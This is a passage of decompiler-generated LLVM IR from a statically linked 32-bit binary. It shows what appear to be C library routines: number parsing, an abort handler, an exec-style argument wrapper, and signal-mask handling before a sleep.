  %v0_804ee8920 = phi i32 [ %v1_804edf7, %dec_label_pc_804edf7 ], [ %v4_804edb9, %dec_label_pc_804edef ], [ %v1_804edf7, %dec_label_pc_804ee06 ]
  %v0_804ee09 = phi i32 [ %v1_804edf8, %dec_label_pc_804edf7 ], [ %v1_804edef, %dec_label_pc_804edef ], [ %v2_804ee06, %dec_label_pc_804ee06 ]
  %v7_804ee0c = icmp sgt i32 %v0_804ee09, 16
  br i1 %v7_804ee0c, label %dec_label_pc_804ee0e, label %dec_label_pc_804ee13

dec_label_pc_804ee0e:                             ; preds = %dec_label_pc_804ee09
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ee13

dec_label_pc_804ee13:                             ; preds = %dec_label_pc_804ee09, %dec_label_pc_804ede5, %dec_label_pc_804ee0e
  %v0_804ee8921 = phi i32 [ %v0_804ee8920, %dec_label_pc_804ee09 ], [ %v4_804edb9, %dec_label_pc_804ede5 ], [ %v0_804ee8920, %dec_label_pc_804ee0e ]
  %v0_804ee3213 = phi i32 [ %v0_804ee3212, %dec_label_pc_804ee09 ], [ %v0_804edf7, %dec_label_pc_804ede5 ], [ %v0_804ee3212, %dec_label_pc_804ee0e ]
  %v0_804ee22 = phi i32 [ %v0_804ee09, %dec_label_pc_804ee09 ], [ %arg3, %dec_label_pc_804ede5 ], [ 16, %dec_label_pc_804ee0e ]
  %v1_804ee13 = add i32 %v0_804ee22, -2
  store i32 %v1_804ee13, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_804ee1b = icmp ugt i32 %v1_804ee13, 34
  br i1 %v6_804ee1b, label %dec_label_pc_804ee7e, label %dec_label_pc_804ee1d

dec_label_pc_804ee1d:                             ; preds = %dec_label_pc_804ee13
  %div = udiv i32 -1, %v0_804ee22
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_804ee22
  %v1_804ee24 = trunc i32 %tmp38 to i8
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_804ee5e = urem i32 %arg4, 256
  br label %dec_label_pc_804ee32

dec_label_pc_804ee30:                             ; preds = %dec_label_pc_804ee74, %dec_label_pc_804ee5e
  %v4_804ee32.pre = phi i32 [ %v1_804ee48, %dec_label_pc_804ee74 ], [ %v4_804ee32.pre.pre, %dec_label_pc_804ee5e ]
  %v0_804ee30 = phi i32 [ %v1_804ee4f, %dec_label_pc_804ee74 ], [ %v0_804ee30.pre, %dec_label_pc_804ee5e ]
  br label %dec_label_pc_804ee32

dec_label_pc_804ee32:                             ; preds = %dec_label_pc_804ee1d, %dec_label_pc_804ee30
  %v0_804ee8919 = phi i32 [ %v0_804ee8921, %dec_label_pc_804ee1d ], [ %v0_804ee30, %dec_label_pc_804ee30 ]
  %v0_804ee4f = phi i32 [ %v0_804ee3213, %dec_label_pc_804ee1d ], [ %v0_804ee30, %dec_label_pc_804ee30 ]
  %v4_804ee32 = phi i32 [ %div, %dec_label_pc_804ee1d ], [ %v4_804ee32.pre, %dec_label_pc_804ee30 ]
  %v1_804ee32 = inttoptr i32 %v0_804ee4f to i8*
  %v2_804ee32 = load i8, i8* %v1_804ee32, align 1
  %v3_804ee32 = zext i8 %v2_804ee32 to i32
  %v5_804ee32 = and i32 %v4_804ee32, -256
  %v6_804ee32 = or i32 %v3_804ee32, %v5_804ee32
  store i32 %v6_804ee32, i32* %eax.global-to-local, align 4
  %v1_804ee34 = add i32 %v6_804ee32, -48
  %v1_804ee37 = trunc i32 %v1_804ee34 to i8
  %tmp55 = icmp ult i8 %v1_804ee37, 10
  br i1 %tmp55, label %dec_label_pc_804ee48, label %dec_label_pc_804ee3c

dec_label_pc_804ee3c:                             ; preds = %dec_label_pc_804ee32
  %v1_804ee3c = or i32 %v6_804ee32, 32
  %v3_804ee3c = trunc i32 %v1_804ee3c to i8
  store i32 %v1_804ee3c, i32* %eax.global-to-local, align 4
  %v1_804ee3f = and i32 %v1_804ee34, -256
  %v2_804ee3f = or i32 %v1_804ee3f, 40
  %tmp56 = icmp ult i8 %v3_804ee3c, 97
  br i1 %tmp56, label %dec_label_pc_804ee48, label %dec_label_pc_804ee45

dec_label_pc_804ee45:                             ; preds = %dec_label_pc_804ee3c
  %v1_804ee45 = add i32 %v1_804ee3c, -87
  br label %dec_label_pc_804ee48

dec_label_pc_804ee48:                             ; preds = %dec_label_pc_804ee3c, %dec_label_pc_804ee32, %dec_label_pc_804ee45
  %v0_804ee77 = phi i32 [ %v2_804ee3f, %dec_label_pc_804ee3c ], [ %v1_804ee34, %dec_label_pc_804ee32 ], [ %v1_804ee45, %dec_label_pc_804ee45 ]
  %v1_804ee48 = urem i32 %v0_804ee77, 256
  store i32 %v1_804ee48, i32* %eax.global-to-local, align 4
  %v1_804ee4b = load i32, i32* %esi.global-to-local, align 4
  %v2_804ee4b = sub i32 %v1_804ee48, %v1_804ee4b
  %v10_804ee4b = and i32 %v2_804ee4b, %v1_804ee4b
  %v11_804ee4b = icmp slt i32 %v10_804ee4b, 0
  %v13_804ee4b = icmp slt i32 %v2_804ee4b, 0
  %v2_804ee4d = icmp eq i1 %v13_804ee4b, %v11_804ee4b
  br i1 %v2_804ee4d, label %dec_label_pc_804ee7e, label %dec_label_pc_804ee4f

dec_label_pc_804ee4f:                             ; preds = %dec_label_pc_804ee48
  %v1_804ee4f = add i32 %v0_804ee4f, 1
  store i32 %v1_804ee4f, i32* %ebx.global-to-local, align 4
  %v0_804ee50 = load i32, i32* %edx.global-to-local, align 4
  %tmp57 = icmp ugt i32 %v0_804ee50, %div
  br i1 %tmp57, label %dec_label_pc_804ee5e, label %dec_label_pc_804ee56

dec_label_pc_804ee56:                             ; preds = %dec_label_pc_804ee4f
  %v15_804ee50 = icmp eq i32 %v0_804ee50, %div
  %v1_804ee56 = icmp eq i1 %v15_804ee50, false
  br i1 %v1_804ee56, label %dec_label_pc_804ee74, label %dec_label_pc_804ee58

dec_label_pc_804ee58:                             ; preds = %dec_label_pc_804ee56
  %v1_804ee58 = trunc i32 %v0_804ee77 to i8
  %tmp58 = icmp ugt i8 %v1_804ee58, %v1_804ee24
  br i1 %tmp58, label %dec_label_pc_804ee5e, label %dec_label_pc_804ee74

dec_label_pc_804ee5e:                             ; preds = %dec_label_pc_804ee58, %dec_label_pc_804ee4f
  store i32 %v4_804ee5e, i32* %eax.global-to-local, align 4
  %v0_804ee62 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ee62 = and i32 %v0_804ee62, %v4_804ee5e
  store i32 %v2_804ee62, i32* %ebp.global-to-local, align 4
  %v1_804ee64 = call i32 @function_804b774(i32 %div)
  store i32 %v1_804ee64, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804ee6c = inttoptr i32 %v1_804ee64 to i32*
  store i32 34, i32* %v1_804ee6c, align 4
  %v0_804ee30.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804ee32.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee30

dec_label_pc_804ee74:                             ; preds = %dec_label_pc_804ee58, %dec_label_pc_804ee56
  %v4_804ee74 = mul i32 %v0_804ee50, %v1_804ee4b
  store i32 %v1_804ee48, i32* %eax.global-to-local, align 4
  %v2_804ee7a = add i32 %v4_804ee74, %v1_804ee48
  store i32 %v2_804ee7a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ee30

dec_label_pc_804ee7e:                             ; preds = %dec_label_pc_804ee48, %dec_label_pc_804ee13
  %v0_804ee89 = phi i32 [ %v0_804ee8921, %dec_label_pc_804ee13 ], [ %v0_804ee8919, %dec_label_pc_804ee48 ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_804ee13 ], [ %div, %dec_label_pc_804ee48 ]
  %v4_804ee7e = icmp eq i32 %arg2, 0
  br i1 %v4_804ee7e, label %dec_label_pc_804ee8b, label %dec_label_pc_804ee85

dec_label_pc_804ee85:                             ; preds = %dec_label_pc_804ee7e
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804ee89 = inttoptr i32 %arg2 to i32*
  store i32 %v0_804ee89, i32* %v2_804ee89, align 4
  br label %dec_label_pc_804ee8b

dec_label_pc_804ee8b:                             ; preds = %dec_label_pc_804ee7e, %dec_label_pc_804ee85
  %v0_804ee8b = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804ee8b, i32* %eax.global-to-local, align 4
  %v1_804ee8d = trunc i32 %v0_804ee8b to i8
  %v6_804ee8d = icmp eq i8 %v1_804ee8d, 0
  %v2_804ee8f = zext i1 %v6_804ee8d to i32
  %v1_804ee914 = or i32 %v2_804ee8f, -2147483648
  store i32 %v1_804ee914, i32* %ebx.global-to-local, align 4
  %v5_804ee97 = icmp eq i8 %tmp37, 0
  br i1 %v5_804ee97, label %dec_label_pc_804eeaf, label %dec_label_pc_804ee9e

dec_label_pc_804ee9e:                             ; preds = %dec_label_pc_804ee8b
  %v0_804ee9e = load i32, i32* %edx.global-to-local, align 4
  %tmp59 = icmp ugt i32 %v0_804ee9e, %v1_804ee914
  br i1 %tmp59, label %dec_label_pc_804eea2, label %dec_label_pc_804eeaf

dec_label_pc_804eea2:                             ; preds = %dec_label_pc_804ee9e
  %v1_804eea2 = call i32 @function_804b774(i32 %stack_var_-24.0)
  store i32 %v1_804eea2, i32* %eax.global-to-local, align 4
  %v0_804eea7 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804eea7, i32* %edx.global-to-local, align 4
  %v1_804eea9 = inttoptr i32 %v1_804eea2 to i32*
  store i32 34, i32* %v1_804eea9, align 4
  %v0_804eeaf.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804eeaf

dec_label_pc_804eeaf:                             ; preds = %dec_label_pc_804ee9e, %dec_label_pc_804ee8b, %dec_label_pc_804eea2
  %v0_804eeaf = phi i32 [ %v0_804ee8b, %dec_label_pc_804ee9e ], [ %v0_804ee8b, %dec_label_pc_804ee8b ], [ %v0_804eeaf.pre, %dec_label_pc_804eea2 ]
  store i32 %v0_804eeaf, i32* %eax.global-to-local, align 4
  %v3_804eeb1 = trunc i32 %v0_804eeaf to i8
  %v4_804eeb1 = icmp eq i8 %v3_804eeb1, 0
  %v0_804eeba.pre = load i32, i32* %edx.global-to-local, align 4
  br i1 %v4_804eeb1, label %dec_label_pc_804eeb7, label %dec_label_pc_804eeb5

dec_label_pc_804eeb5:                             ; preds = %dec_label_pc_804eeaf
  %v1_804eeb5 = sub i32 0, %v0_804eeba.pre
  store i32 %v1_804eeb5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eeb7

dec_label_pc_804eeb7:                             ; preds = %dec_label_pc_804eeaf, %dec_label_pc_804eeb5
  %v0_804eeba = phi i32 [ %v1_804eeb5, %dec_label_pc_804eeb5 ], [ %v0_804eeba.pre, %dec_label_pc_804eeaf ]
  store i32 %v0_804eeba, i32* %eax.global-to-local, align 4
  %v2_804eebc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804eebc, i32* @ebx, align 4
  ret i32 %v0_804eeba

; uselistorder directives
  uselistorder i32 %v0_804eeba, { 1, 0 }
  uselistorder i32 %v0_804eeaf, { 1, 0 }
  uselistorder i32 %v0_804ee50, { 0, 2, 1 }
  uselistorder i32 %v1_804ee4f, { 1, 0 }
  uselistorder i32 %v2_804ee4b, { 1, 0 }
  uselistorder i32 %v1_804ee48, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_804ee77, { 1, 0 }
  uselistorder i32 %v0_804ee30, { 1, 0 }
  uselistorder i32 %v4_804ee5e, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_804ee22, { 1, 0, 2 }
  uselistorder i32 %v2_804ee06, { 1, 0 }
  uselistorder i32 %v1_804edff, { 1, 0 }
  uselistorder i32 %v1_804edf8, { 1, 0, 2 }
  uselistorder i32 %v0_804edf7, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_804edc6.lcssa, { 1, 0 }
  uselistorder i32 %v0_804edc5.lcssa, { 1, 0 }
  uselistorder i32 %v1_804edc5, { 0, 3, 2, 1 }
  uselistorder i32 %v4_804edb9, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_804edb3, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 6, 1, 7, 2, 3, 4, 5, 8, 9 }
  uselistorder i32* %ebp.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 -87, { 1, 0 }
  uselistorder i32 -17, { 8, 0, 2, 3, 4, 5, 6, 7, 1 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804eeb7, { 1, 0 }
  uselistorder label %dec_label_pc_804eeaf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ee8b, { 1, 0 }
  uselistorder label %dec_label_pc_804ee48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ee32, { 1, 0 }
  uselistorder label %dec_label_pc_804ee13, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ee09, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ede5, { 1, 0 }
  uselistorder label %dec_label_pc_804ede4, { 1, 0 }
  uselistorder label %dec_label_pc_804edc5, { 1, 0 }
}

define i32 @function_804eec4(i32 %arg1) local_unnamed_addr {
dec_label_pc_804eec4:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_804eed7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804eed7, i32* @ebx, align 4
  %v2_804eedc = call i32 @function_804f2ae(i32 %v2_804eed7, i32 134541995)
  %v1_804eee8 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8056060.170 to i32))
  %v0_804eeed = load i32, i32* @global_var_8058744.171, align 4
  store i32 %v0_804eeed, i32* @eax, align 4
  %v1_804eef5 = icmp eq i32 %v0_804eeed, 0
  br i1 %v1_804eef5, label %dec_label_pc_804ef02, label %dec_label_pc_804eef9

dec_label_pc_804eef9:                             ; preds = %dec_label_pc_804eec4
  %v0_804eefc = load i32, i32* @esi, align 4
  %v1_804eefd = call i32 @unknown_0(i32 %v0_804eefc)
  store i32 %v1_804eefd, i32* @eax, align 4
  br label %dec_label_pc_804ef02

dec_label_pc_804ef02:                             ; preds = %dec_label_pc_804eec4, %dec_label_pc_804eef9
  %v2_804ef07 = call i32 @function_804f2ae(i32 %v2_804eed7, i32 1)
  %v0_804ef0c = call i32 @function_804f26c()
  %v0_804ef1d = call i32 @function_804bef0()
  %v0_804ef25 = load i32, i32* @esi, align 4
  %v1_804ef26 = call i32 @function_804f700(i32 %v0_804ef25)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_804f700, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ef02, { 1, 0 }
}

define i32 @function_804ef2c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804ef2c:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804ef30 = load i32, i32* @ebx, align 4
  store i32 %v0_804ef30, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804ef33 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_804ef33, i32* %eax.global-to-local, align 4
  %v12_804ef36 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804ef3c

dec_label_pc_804ef3c:                             ; preds = %dec_label_pc_804ef3c, %dec_label_pc_804ef2c
  %v0_804ef3f = phi i32 [ 0, %dec_label_pc_804ef2c ], [ %v1_804ef3f, %dec_label_pc_804ef3c ]
  %stack_var_-16.0 = phi i32 [ %v2_804ef33, %dec_label_pc_804ef2c ], [ %v1_804ef40, %dec_label_pc_804ef3c ]
  %v1_804ef3f = add i32 %v0_804ef3f, 1
  store i32 %v1_804ef3f, i32* %esi.global-to-local, align 4
  %v1_804ef40 = add i32 %stack_var_-16.0, 4
  store i32 %v1_804ef40, i32* %eax.global-to-local, align 4
  %v1_804ef46 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_804ef46 = load i32, i32* %v1_804ef46, align 4
  %v3_804ef46 = icmp eq i32 %v2_804ef46, 0
  %v1_804ef49 = icmp eq i1 %v3_804ef46, false
  br i1 %v1_804ef49, label %dec_label_pc_804ef3c, label %dec_label_pc_804ef4b

dec_label_pc_804ef4b:                             ; preds = %dec_label_pc_804ef3c
  %v1_804ef4b = mul i32 %v1_804ef3f, 4
  %v2_804ef4b = add i32 %v1_804ef4b, 34
  %v1_804ef52 = and i32 %v2_804ef4b, -16
  %v2_804ef55 = sub i32 %v12_804ef36, %v1_804ef52
  %v1_804ef5a = add i32 %v2_804ef55, 15
  %v1_804ef5e = and i32 %v1_804ef5a, -16
  store i32 %v1_804ef5e, i32* @ebx, align 4
  store i32 %v1_804ef5e, i32* %ecx.global-to-local, align 4
  %v2_804ef63 = inttoptr i32 %v1_804ef5e to i32*
  store i32 %arg2, i32* %v2_804ef63, align 16
  store i32 %v2_804ef33, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef6b

dec_label_pc_804ef6b:                             ; preds = %dec_label_pc_804ef6b, %dec_label_pc_804ef4b
  %stack_var_-16.1 = phi i32 [ %v2_804ef33, %dec_label_pc_804ef4b ], [ %v1_804ef72, %dec_label_pc_804ef6b ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_804ef6e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ef6e = add i32 %v0_804ef6e, 4
  store i32 %v1_804ef6e, i32* %ecx.global-to-local, align 4
  %v0_804ef71 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ef71 = add i32 %v0_804ef71, -1
  %v8_804ef71 = icmp eq i32 %v1_804ef71, 0
  store i32 %v1_804ef71, i32* %esi.global-to-local, align 4
  %v1_804ef72 = add i32 %stack_var_-16.1, 4
  %v1_804ef78 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_804ef78 = load i32, i32* %v1_804ef78, align 4
  store i32 %v2_804ef78, i32* %eax.global-to-local, align 4
  %v2_804ef7a = inttoptr i32 %v1_804ef6e to i32*
  store i32 %v2_804ef78, i32* %v2_804ef7a, align 4
  %v1_804ef7c = icmp eq i1 %v8_804ef71, false
  br i1 %v1_804ef7c, label %dec_label_pc_804ef6b, label %dec_label_pc_804ef7e

dec_label_pc_804ef7e:                             ; preds = %dec_label_pc_804ef6b
  %v0_804ef7e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef7e = load i32, i32* @esp, align 4
  %v2_804ef7e = add i32 %v1_804ef7e, -4
  %v3_804ef7e = inttoptr i32 %v2_804ef7e to i32*
  store i32 %v0_804ef7e, i32* %v3_804ef7e, align 4
  %v0_804ef7f = load i32, i32* @global_var_805874c.172, align 4
  %v2_804ef7f = add i32 %v1_804ef7e, -8
  %v3_804ef7f = inttoptr i32 %v2_804ef7f to i32*
  store i32 %v0_804ef7f, i32* %v3_804ef7f, align 4
  %v0_804ef85 = load i32, i32* @ebx, align 4
  %v2_804ef85 = add i32 %v1_804ef7e, -12
  %v3_804ef85 = inttoptr i32 %v2_804ef85 to i32*
  store i32 %v0_804ef85, i32* %v3_804ef85, align 4
  %v5_804ef86 = add i32 %v1_804ef7e, -16
  %v6_804ef86 = inttoptr i32 %v5_804ef86 to i32*
  store i32 %arg1, i32* %v6_804ef86, align 4
  %v1_804ef89 = inttoptr i32 %v1_804ef72 to i8*
  %v2_804ef89 = call i32 @function_804f790(i8* %v1_804ef89)
  store i32 %v2_804ef89, i32* %eax.global-to-local, align 4
  %v2_804ef91 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ef91, i32* @ebx, align 4
  ret i32 %v2_804ef89

; uselistorder directives
  uselistorder i32 %v1_804ef71, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_804ef40, { 1, 0 }
  uselistorder i32 %v1_804ef3f, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804ef33, { 0, 2, 1, 3 }
}

define i32 @function_804ef98(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ef98:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_804ef98 = load i32, i32* @ebp, align 4
  %v0_804ef99 = load i32, i32* @edi, align 4
  %v0_804ef9a = load i32, i32* @esi, align 4
  %v0_804ef9b = load i32, i32* @ebx, align 4
  %v15_804ef9c = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804efae = icmp eq i32 %arg1, 0
  %v1_804efb0 = icmp eq i1 %v1_804efae, false
  br i1 %v1_804efb0, label %dec_label_pc_804efc2.preheader, label %dec_label_pc_804f10f

dec_label_pc_804efc2.preheader:                   ; preds = %dec_label_pc_804ef98
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804efb7

dec_label_pc_804efb7:                             ; preds = %dec_label_pc_804efb7.dec_label_pc_804efb7_crit_edge, %dec_label_pc_804efc2.preheader
  %v0_804efb7 = phi i32 [ %v15_804ef9c, %dec_label_pc_804efc2.preheader ], [ %v0_804efb7.pre, %dec_label_pc_804efb7.dec_label_pc_804efb7_crit_edge ]
  %v1_804efc229 = phi i32 [ 31, %dec_label_pc_804efc2.preheader ], [ %v1_804efc2, %dec_label_pc_804efb7.dec_label_pc_804efb7_crit_edge ]
  %v2_804efb7 = mul i32 %v1_804efc229, 4
  %v3_804efb7 = add i32 %v2_804efb7, 292
  %v4_804efb7 = add i32 %v3_804efb7, %v0_804efb7
  %v5_804efb7 = inttoptr i32 %v4_804efb7 to i32*
  store i32 0, i32* %v5_804efb7, align 4
  %v0_804efc2.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804efc2 = add i32 %v0_804efc2.pre, -1
  %v9_804efc2 = icmp slt i32 %v1_804efc2, 0
  store i32 %v1_804efc2, i32* %eax.global-to-local, align 4
  %v1_804efc3 = icmp eq i1 %v9_804efc2, false
  br i1 %v1_804efc3, label %dec_label_pc_804efb7.dec_label_pc_804efb7_crit_edge, label %dec_label_pc_804efc5

dec_label_pc_804efb7.dec_label_pc_804efb7_crit_edge: ; preds = %dec_label_pc_804efb7
  %v0_804efb7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804efb7

dec_label_pc_804efc5:                             ; preds = %dec_label_pc_804efb7
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804efdb = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804efdb, i32* @ebx, align 4
  store i32 %v2_804efdb, i32* %stack_var_-460, align 4
  %v4_804efe3 = call i32 @function_8051294(i32 %v2_804efdb, i32 17, i32 %v1_804efc2, i32 %v1_804efc2)
  store i32 %v4_804efe3, i32* %eax.global-to-local, align 4
  %v2_804efeb = icmp slt i32 %v4_804efe3, 0
  br i1 %v2_804efeb, label %dec_label_pc_804f113, label %dec_label_pc_804eff3

dec_label_pc_804eff3:                             ; preds = %dec_label_pc_804efc5
  %v2_804eff4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_804eff4, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_804efff = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_804efff = call i32 @function_804fa50(i32 0, %_TYPEDEF_sigset_t* %v3_804efff, i32 %v2_804eff4)
  store i32 %v4_804efff, i32* %eax.global-to-local, align 4
  %v1_804f007 = icmp eq i32 %v4_804efff, 0
  %v1_804f009 = icmp eq i1 %v1_804f007, false
  br i1 %v1_804f009, label %dec_label_pc_804f113, label %dec_label_pc_804f00f

dec_label_pc_804f00f:                             ; preds = %dec_label_pc_804eff3
  store i32 %v2_804eff4, i32* %stack_var_-460, align 4
  %v4_804f014 = call i32 @function_8051270(i32 %v2_804eff4, i32 17, i32 %v4_804efff, i32 %v4_804efff)
  store i32 %v4_804f014, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_804f021 = icmp eq i32 %v4_804f014, 0
  br i1 %v1_804f021, label %dec_label_pc_804f035.preheader, label %dec_label_pc_804f0dd

dec_label_pc_804f035.preheader:                   ; preds = %dec_label_pc_804f00f
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f02a

dec_label_pc_804f02a:                             ; preds = %dec_label_pc_804f02a.dec_label_pc_804f02a_crit_edge, %dec_label_pc_804f035.preheader
  %v0_804f02a = phi i32 [ %v15_804ef9c, %dec_label_pc_804f035.preheader ], [ %v0_804f02a.pre, %dec_label_pc_804f02a.dec_label_pc_804f02a_crit_edge ]
  %v1_804f03528 = phi i32 [ 31, %dec_label_pc_804f035.preheader ], [ %v1_804f035, %dec_label_pc_804f02a.dec_label_pc_804f02a_crit_edge ]
  %v2_804f02a = mul i32 %v1_804f03528, 4
  %v3_804f02a = add i32 %v2_804f02a, 292
  %v4_804f02a = add i32 %v3_804f02a, %v0_804f02a
  %v5_804f02a = inttoptr i32 %v4_804f02a to i32*
  store i32 0, i32* %v5_804f02a, align 4
  %v0_804f035.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_804f035 = add i32 %v0_804f035.pre, -1
  %v9_804f035 = icmp slt i32 %v1_804f035, 0
  store i32 %v1_804f035, i32* %edx.global-to-local, align 4
  %v1_804f036 = icmp eq i1 %v9_804f035, false
  br i1 %v1_804f036, label %dec_label_pc_804f02a.dec_label_pc_804f02a_crit_edge, label %dec_label_pc_804f038

dec_label_pc_804f02a.dec_label_pc_804f02a_crit_edge: ; preds = %dec_label_pc_804f02a
  %v0_804f02a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f02a

dec_label_pc_804f038:                             ; preds = %dec_label_pc_804f02a
  store i32 %v2_804efdb, i32* %eax.global-to-local, align 4
  store i32 %v2_804efdb, i32* %stack_var_-460, align 4
  %v4_804f044 = call i32 @function_8051294(i32 %v2_804efdb, i32 17, i32 0, i32 0)
  store i32 %v4_804f044, i32* %eax.global-to-local, align 4
  %v2_804f04c = icmp slt i32 %v4_804f044, 0
  br i1 %v2_804f04c, label %dec_label_pc_804f113, label %dec_label_pc_804f054

dec_label_pc_804f054:                             ; preds = %dec_label_pc_804f038
  %v2_804f055 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_804f055, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v5_804f05e = call i32 @function_804f4eb(i32 17, i32* null, i32 %v2_804f055, i32 %v4_804f044)
  store i32 %v5_804f05e, i32* %eax.global-to-local, align 4
  %v2_804f066 = icmp slt i32 %v5_804f05e, 0
  %v1_804f068 = icmp eq i1 %v2_804f066, false
  br i1 %v1_804f068, label %dec_label_pc_804f092, label %dec_label_pc_804f06a

dec_label_pc_804f06a:                             ; preds = %dec_label_pc_804f054
  %v0_804f06a = load i32, i32* %stack_var_-460, align 4
  %v1_804f06a = call i32 @function_804b774(i32 %v0_804f06a)
  store i32 %v1_804f06a, i32* %eax.global-to-local, align 4
  store i32 %v1_804f06a, i32* @ebx, align 4
  %v1_804f071 = inttoptr i32 %v1_804f06a to i32*
  %v2_804f071 = load i32, i32* %v1_804f071, align 4
  store i32 %v2_804f071, i32* @esi, align 4
  store i32 %v2_804eff4, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804f080 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804f080 = call i32 @function_804fa50(i32 2, %_TYPEDEF_sigset_t* %v3_804f080, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804f08b = load i32, i32* @esi, align 4
  %v1_804f08b = load i32, i32* @ebx, align 4
  %v2_804f08b = inttoptr i32 %v1_804f08b to i32*
  store i32 %v0_804f08b, i32* %v2_804f08b, align 4
  %v0_804f120.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f116

dec_label_pc_804f092:                             ; preds = %dec_label_pc_804f054
  %v3_804f092 = load i32, i32* %stack_var_-420, align 4
  %v12_804f092 = icmp eq i32 %v3_804f092, 1
  %v2_804f09e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804f09e, i32* @ebx, align 4
  %v1_804f0a5 = icmp eq i1 %v12_804f092, false
  br i1 %v1_804f0a5, label %dec_label_pc_804f0cc, label %dec_label_pc_804f0a7

dec_label_pc_804f0a7:                             ; preds = %dec_label_pc_804f092
  %v0_804f0a7 = load i32, i32* @edi, align 4
  store i32 %v2_804f09e, i32* %stack_var_-460, align 4
  %v4_804f0ab = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804f0ab = call i32 @function_804f938(%timespec* %v4_804f0ab, i32 %v2_804f09e, i32 %v0_804f0a7, i32 %v0_804f0a7)
